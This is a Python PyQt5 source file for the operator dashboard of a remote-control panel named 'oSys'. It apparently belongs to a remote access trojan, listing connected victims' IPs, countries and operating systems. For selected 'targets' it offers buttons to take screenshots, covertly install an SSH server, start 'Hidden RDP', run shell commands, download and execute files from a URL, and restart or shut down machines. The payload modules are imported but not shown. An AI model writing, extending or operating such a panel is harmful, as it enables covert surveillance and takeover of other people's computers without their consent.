from PyQt5.QtWidgets import QWidget, QVBoxLayout, QTableWidget, QAbstractItemView, QHeaderView, QHBoxLayout, QPushButton, QMessageBox, QCheckBox, QTableWidgetItem, QTabWidget, QTextEdit, QLineEdit, QApplication
from PyQt5 import QtCore
from Modules import shell as Shell, power as Power, execute as Execute, hrdp as HRDP, screenshot as Screenshot
import config
from sys import argv, exit
from socket import error as socket_error


class Window(QWidget):
    def __init__(self):
        """ Initiates the main GUI window. """
        super().__init__()
        self.setWindowTitle("oSys - Panel Dashboard | Version: 1.0")
        self.resize(530, 350)
        self.menu = Menu([0])

        # Create a top-level layout
        layout = QVBoxLayout()
        layout.addWidget(self.dashboard_ui())
        self.setLayout(layout)

        # Auto-Update Table data
        self.update_invoker = QtCore.QTimer()
        self.update_invoker.start(config.UPDATE_TABLE_COOLDOWN)
        self.update_invoker.timeout.connect(self._update_table_data)

    # --- UI Tabs ---
    def dashboard_ui(self):
        """ :return: the dashboard ui as a widget"""
        # Panel Dashboard Table Widget
        self.table = QTableWidget(0, 6)
        self.table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.table.resizeColumnsToContents()
        self.table.resizeRowsToContents()
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.table.setHorizontalHeaderLabels([' ', 'Country', 'Name', 'IP', 'OS', 'Task menu'])

        # Load table data
        self._update_table_data()

        # Set Layout
        button_layout = QHBoxLayout()
        layout = QVBoxLayout()
        layout.addLayout(button_layout)
        layout.addWidget(self.table)
        dashboard_tab = QWidget()
        dashboard_tab.setLayout(layout)

        # Set Selection buttons
        select_all_button = QPushButton("Select all", clicked=lambda: self._select_all_rows(select_state=True))
        deselect_all_button = QPushButton("De-Select all", clicked=lambda: self._select_all_rows(select_state=False))
        selected_users_menu_button = QPushButton("Menu - Selected Users", clicked=self._create_menu_selected)
        button_layout.addWidget(select_all_button)
        button_layout.addWidget(deselect_all_button)
        button_layout.addWidget(selected_users_menu_button)

        return dashboard_tab

    @staticmethod
    def no_selected_users_error_ui():
        """ Pops up an error message. """
        popup = QMessageBox()
        popup.setWindowTitle("Error!")
        popup.setText("No users selected")
        popup.exec_()

    def closeEvent(self, event):
        """ Pops up a warning message asking the user if he's sure he wants to close the program. """
        close = QMessageBox()
        close.setWindowTitle('Server Is Running')
        close.setText('Are you sure you want to close the program?')
        close.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
        close = close.exec()

        if close == QMessageBox.Yes:
            event.accept()
        else:
            event.ignore()

    # --- Private functions ---
    def _update_table_data(self):
        """ This function updates the table according to the client list. """
        # Checks connections are still alive
        current_target = 0
        for client in config.client_list:
            try:
                conn = client['data']['socket']
                conn.send(''.encode())
                current_target += 1
            except socket_error:
                config.delete_client(current_target)
                self.menu.setVisible(False)

        # Updates the table data
        self.table.clearContents()
        self.table.setRowCount(len(config.client_list))
        for i in range(self.table.rowCount()):
            checkbox = QCheckBox(checked=i in config.targets, clicked=(lambda i: lambda: self._on_checkbox_click(i))(i))
            checkbox.setEnabled(not self.menu.isVisible())
            self.table.setCellWidget(i, 0, checkbox)
            self.table.setItem(i, 1, QTableWidgetItem(config.client_list[i]['data']['countryCode']))
            self.table.setItem(i, 2, QTableWidgetItem(config.client_list[i]['data']['name']))
            self.table.setItem(i, 3, QTableWidgetItem(config.client_list[i]['ip']))
            self.table.setItem(i, 4, QTableWidgetItem(config.client_list[i]['data']['os']))
            self.table.setCellWidget(i, 5, QPushButton("Menu {}".format(i + 1), clicked=(lambda i: lambda: self._create_menu([i]))(i)))

    def _set_row_selection_state(self, enabled=True):
        """ Enables/Disables the state of the tick-boxes"""
        for i in range(self.table.rowCount()):
            self.table.cellWidget(i, 0).setEnabled(enabled)

    def _on_checkbox_click(self, target):
        """
        This function is being activated upon checkbox click.
        This function sets the value adds the client to the targets list if it's ticked. Else, it removes it.
        :parm target: Number of client
        """
        if self.table.cellWidget(target, 0).isChecked() is True:
            config.targets.append(target)
        else:
            config.targets.remove(target)

    def _select_all_rows(self, select_state):
        """
        This function will select/de-select all the rows in the table
        :param select_state: Selection state. True=Ticked | False=Un-ticked
        """
        for i in range(self.table.rowCount()):
            if not self.table.cellWidget(i, 0).isChecked() is select_state:
                self.table.cellWidget(i, 0).setChecked(select_state)
                if select_state:
                    config.targets.append(i)
                else:
                    config.targets.remove(i)

    def _create_menu_selected(self):
        """ This function creates a menu panel for all of the selected targets. If no target was selected, a error message would pop up"""
        for i in range(self.table.rowCount()):
            if self.table.cellWidget(i, 0).isChecked():
                self._create_menu(config.targets)
                return
        self.no_selected_users_error_ui()

    def _create_menu(self, targets):
        """ Creates a new menu - Closes old one. """
        self.menu.close()
        self.menu = Menu(targets)
        self.menu.show()
        self._set_row_selection_state(False)


class Menu(QWidget):
    def __init__(self, target_list):
        """ Initiates the control panel """
        super().__init__()
        title = 'oSys - Menu ' + (str(target_list[0] + 1) if len(target_list) < 2 else 'for selected users')
        self.setWindowTitle(title)
        self.resize(530, 350)
        config.targets = target_list

        # Create a top-level layout
        layout = QVBoxLayout()
        self.setLayout(layout)

        # Create multiple tabs for each of the modules using their UI widgets
        tabs = QTabWidget()
        if len(target_list) < 2:
            tabs.addTab(self.surveillance_ui(), "Surveillance")
        tabs.addTab(self.shell_ui(), "Shell")
        tabs.addTab(self.file_ui(), "File")
        tabs.addTab(self.power_ui(), "Power")
        layout.addWidget(tabs)

    def closeEvent(self, event):
        """ Enables the option to select clients in the client panel """
        config.WIN._set_row_selection_state(True)

    # --- UI Tabs ---
    def surveillance_ui(self):
        """ :return: the surveillance ui as a widget """
        # Creates Layout
        layout = QVBoxLayout()
        layout.setAlignment(QtCore.Qt.AlignCenter)
        layout.stretch(0)

        # Creates buttons
        screen_shot_button = QPushButton("Screenshot", clicked=self.screenshot_clicked)
        install_ssh_server_button = QPushButton("Install SSH Server", clicked=self.install_ssh_server_clicked)
        uninstall_ssh_server_button = QPushButton("Uninstall SSH Server", clicked=self.uninstall_ssh_server_clicked)
        start_hrdp_button = QPushButton("Start HRDP", clicked=self.start_hrdp_clicked)
        stop_hrdp_button = QPushButton("Stop HRDP", clicked=self.stop_hrdp_clicked)

        # Adds buttons to the layout
        layout.addWidget(screen_shot_button)
        layout.addWidget(install_ssh_server_button)
        layout.addWidget(uninstall_ssh_server_button)
        layout.addWidget(start_hrdp_button)
        layout.addWidget(stop_hrdp_button)

        # Puts the layout inside a widget that can be displayed
        dashboard_tab = QWidget()
        dashboard_tab.setLayout(layout)
        return dashboard_tab

    def shell_ui(self):
        """ :return: the shell ui as a widget"""
        # Creates a layout
        layout = QVBoxLayout()

        # Creates text objects
        self.shell_output = QTextEdit()
        self.shell_output.setReadOnly(True)
        command_input = QLineEdit()
        command_input.setPlaceholderText('dir')

        # Creates buttons
        button_layout = QHBoxLayout()

        run_command_button = QPushButton('Run Command', clicked=lambda: self.send_shell_command(command_input.text().strip()))
        clear_console_button = QPushButton('Clear', clicked=self.shell_output.clear)

        # Adds text objects to layout
        layout.addWidget(command_input, 3)
        layout.addWidget(self.shell_output, 7)

        # Adds buttons to the layout
        button_layout.addWidget(run_command_button)
        button_layout.addWidget(clear_console_button)
        layout.addLayout(button_layout)

        # Puts the layout inside a widget that can be displayed
        dashboard_tab = QWidget()
        dashboard_tab.setLayout(layout)
        return dashboard_tab

    def file_ui(self):
        """ :return: the file tab ui as a widget"""
        # Creates layout
        layout = QVBoxLayout()

        # Creates button and text object
        button_upload = QPushButton('Upload file', clicked=self.upload_file_clicked)
        self.file_url_textbox = QLineEdit()
        self.file_url_textbox.setPlaceholderText('https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe')

        # Adds buttons to the layout
        layout.addWidget(self.file_url_textbox, 3)
        layout.addWidget(button_upload)

        # Puts the layout inside a widget that can be displayed
        dashboard_tab = QWidget()
        dashboard_tab.setLayout(layout)
        return dashboard_tab

    def power_ui(self):
        """ :return: the power ui as a widget"""
        # Creates Layout
        layout = QVBoxLayout()
        layout.setAlignment(QtCore.Qt.AlignCenter)

        # Creates buttons
        restart_button = QPushButton("Restart", clicked=self.restart_clicked)
        shutdown_button = QPushButton("Shut down", clicked=self.shutdown_clicked)

        # Adds buttons to the layout
        layout.addWidget(restart_button)
        layout.addWidget(shutdown_button)

        # Put the layout inside a widget that can be displayed
        dashboard_tab = QWidget()
        dashboard_tab.setLayout(layout)
        return dashboard_tab

    # --- Button Functions ---
    @staticmethod
    def restart_clicked():
        """ Initiates the restart module. """
        Power.restart()

    @staticmethod
    def shutdown_clicked():
        """ Initiates the power module. """
        Power.shutdown()

    @staticmethod
    def screenshot_clicked():
        """ Initiates the screenshot module. """
        Screenshot.screenshot()

    @staticmethod
    def install_ssh_server_clicked():
        """ Initiates the SSH Server installer in the hrdp module. """
        HRDP.install_ssh_server()

    @staticmethod
    def uninstall_ssh_server_clicked():
        """ Initiates the SSH Server uninstaller in the hrdp module. """
        HRDP.uninstall_ssh_server()

    @staticmethod
    def start_hrdp_clicked():
        """ Initiates the Hidden RDP in the hrdp module. """
        HRDP.start()

    @staticmethod
    def stop_hrdp_clicked():
        """ Stops the SSH Server in the hrdp module. """
        HRDP.stop()

    def upload_file_clicked(self):
        """ Initiates the remote file download&execution module. """
        Execute.upload(self.file_url_textbox.text())
        self.file_url_textbox.clear()

    def send_shell_command(self, command):
        """
        This function would send a shell command to the client and show the response in the self.shell_output text object
        :param command: cmd command to operate
        """
        output = Shell.shell(command)
        self.shell_output.clear()
        self.shell_output.insertPlainText(output)


def start():
    """ Starts the GUI. """
    app = QApplication(argv)
    config.WIN = Window()
    config.WIN.show()
    exit(app.exec())
